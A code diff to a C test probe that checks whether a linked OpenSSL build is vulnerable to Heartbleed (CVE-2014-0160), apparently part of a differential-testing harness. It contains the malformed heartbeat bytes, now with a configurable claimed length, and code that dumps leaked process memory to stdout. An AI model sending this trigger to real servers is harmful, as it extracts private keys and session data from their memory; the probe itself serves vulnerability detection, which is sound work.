@@ -21,6 +21,19 @@
  *   exit 2  stderr "hb: indeterminate ..."  — the probe itself failed; never
  *                                              counted as a pass
  *
+ * On the leak path the probe ALSO dumps the echoed heartbeat response — the
+ * leaked process memory — to stdout BEFORE the verdict line, so the leaked
+ * content itself is observable evidence (the memory.leak.sensitive axis's
+ * comparator scans it for private-key markers and high-entropy material).
+ *
+ * The claimed payload length is read from the fixture marker: "malformed
+ * 0x4000" claims 0x4000 bytes (the historical exploit value, and the
+ * default), "malformed 1" claims 1 byte — so a minimizer can reduce the
+ * claim and the court observes the exact trigger threshold. Any claimed
+ * length with zero data bytes is a malformed heartbeat (RFC 6520 §4: a peer
+ * MUST NOT respond), so a heartbeat RESPONSE of any size is the leak — the
+ * classifier is semantic, not a byte-count heuristic.
+ *
  * This probe executes only its own sockets; it never reads a file, so the
  * court's fixture is a marker file the probe does not need (the argv slot
  * keeps the court's declared-arguments contract uniform).
@@ -134,11 +147,23 @@ static const unsigned char CLIENT_HELLO[] = {
 };
 
 /* The malformed heartbeat from the original exploit: record type 0x18
- * (heartbeat), TLS 1.1, 3-byte payload: request type, claimed payload
- * length 0x4000, and the single real payload byte. */
-static const unsigned char HEARTBEAT[] = {
-    0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00,
-};
+ * (heartbeat), TLS 1.1, 3-byte payload: request type, the claimed payload
+ * length, and ZERO real payload bytes (the length is read from the fixture
+ * marker, defaulting to the historical 0x4000). */
+static unsigned char hb_msg[8];
+static size_t hb_msg_len = 8;
+
+static void build_heartbeat(unsigned int claimed) {
+    hb_msg[0] = 0x18;                       /* record type: heartbeat */
+    hb_msg[1] = 0x03;                       /* TLS 1.1 */
+    hb_msg[2] = 0x02;
+    hb_msg[3] = 0x00;                       /* 3-byte payload */
+    hb_msg[4] = 0x03;
+    hb_msg[5] = 0x01;                       /* heartbeat_request */
+    hb_msg[6] = (unsigned char)((claimed >> 8) & 0xff);
+    hb_msg[7] = (unsigned char)(claimed & 0xff);
+    hb_msg_len = 8;
+}
 
 /* Read exactly one TLS record; returns the type, or -1 on EOF/error. */
 static int read_record(int fd, unsigned char *payload, size_t cap,
@@ -183,18 +208,33 @@ int main(int argc, char **argv) {
      * performs the TLS handshake and sends NO heartbeat at all — both
      * builds must behave identically up to the server flight, proving the
      * observed divergence is specific to the malformed CVE-2014-0160
-     * trigger; anything else sends the malformed heartbeat. */
+     * trigger. Any other marker sends the malformed heartbeat; an optional
+     * second token is the claimed payload length ("malformed 0x4000",
+     * hex or decimal — the historical exploit claimed 0x4000). */
     int clean = 0;
+    unsigned int claimed = 0x4000;
     if (argc >= 2) {
         FILE *f = fopen(argv[1], "r");
         if (f) {
             char buf[64] = {0};
             if (fgets(buf, sizeof buf, f)) {
-                clean = (strncmp(buf, "handshake", 9) == 0);
+                if (strncmp(buf, "handshake", 9) == 0) {
+                    clean = 1;
+                } else {
+                    char *p = strchr(buf, ' ');
+                    if (p) {
+                        while (*p == ' ')
+                            p++;
+                        unsigned long v = strtoul(p, NULL, 0);
+                        if (v <= 0xFFFF)
+                            claimed = (unsigned int)v;
+                    }
+                }
             }
             fclose(f);
         }
     }
+    build_heartbeat(claimed);
     SSL_library_init();
     SSL_load_error_strings();
 
@@ -335,8 +375,8 @@ int main(int argc, char **argv) {
                 }
                 /* The historical moment: the read cipher is not yet
                  * active, so the plaintext heartbeat is processed as-is. */
-                if (write(cfd, HEARTBEAT, sizeof HEARTBEAT)
-                    != (ssize_t)sizeof HEARTBEAT) {
+                if (write(cfd, hb_msg, hb_msg_len)
+                    != (ssize_t)hb_msg_len) {
                     last_failure = "heartbeat write failed";
                     handshake_failed = 1;
                     break;
@@ -389,18 +429,18 @@ int main(int argc, char **argv) {
             continue; /* cannot happen; retry rather than misclassify */
         }
         if (got_type == 24) {
-            /* A heartbeat RESPONSE record. With the malformed trigger, a
-             * vulnerable library echoes 16 KiB of process memory; anything
-             * beyond the honest echo (> 256 bytes) is the leak. */
-            if (total > 256) {
-                fprintf(stderr,
-                        "HEARTBLEED: the linked libssl leaked %zu bytes in the heartbeat response\n",
-                        total);
-                return 1;
-            }
-            fprintf(stdout, "hb: no leak (small %zu-byte heartbeat response)\n",
+            /* A heartbeat RESPONSE record to the MALFORMED trigger. RFC
+             * 6520 §4 requires a peer to DISCARD a malformed heartbeat;
+             * answering it is the vulnerability (CVE-2014-0160) — the
+             * echoed bytes are process memory, whatever the size. Dump the
+             * leaked content to stdout (the memory.leak.sensitive axis's
+             * raw material), then the verdict line on stderr. */
+            fwrite(payload, 1, total, stdout);
+            fflush(stdout);
+            fprintf(stderr,
+                    "HEARTBLEED: the linked libssl echoed %zu bytes in the heartbeat response\n",
                     total);
-            return 0;
+            return 1;
         }
         if (got_type == 21) {
             /* A fatal alert: the malformed heartbeat was refused. */
